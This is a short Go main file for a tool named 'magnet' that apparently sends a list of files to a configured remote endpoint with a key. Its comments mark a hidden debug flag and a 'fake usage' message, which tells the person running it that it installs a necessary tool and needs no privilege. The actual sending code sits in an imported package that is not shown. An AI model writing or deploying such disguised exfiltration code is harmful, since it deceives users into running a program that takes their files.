package main

import (
	"flag"
	"fmt"

	"github.com/ariary/magnet/pkg/magnet"
)

var FileList string
var Endpoint string
var Key string
var Method string

var usage string

func main() {
	// hide debug functionnality
	var debug bool
	flag.BoolVar(&debug, "thisisdebug", false, "")
	// fake usage
	usage = `
	Execute file to install necessary tool. (For security reasons the process does not require privilege)
	`
	flag.Usage = func() { fmt.Print(usage) }
	flag.Parse()

	sender := magnet.InitMagnetSender(Method)

	magnet.Magnet(sender, FileList, Endpoint, Key, debug)
	//magnet.Magnet(FileList, Endpoint, Key, debug)

}
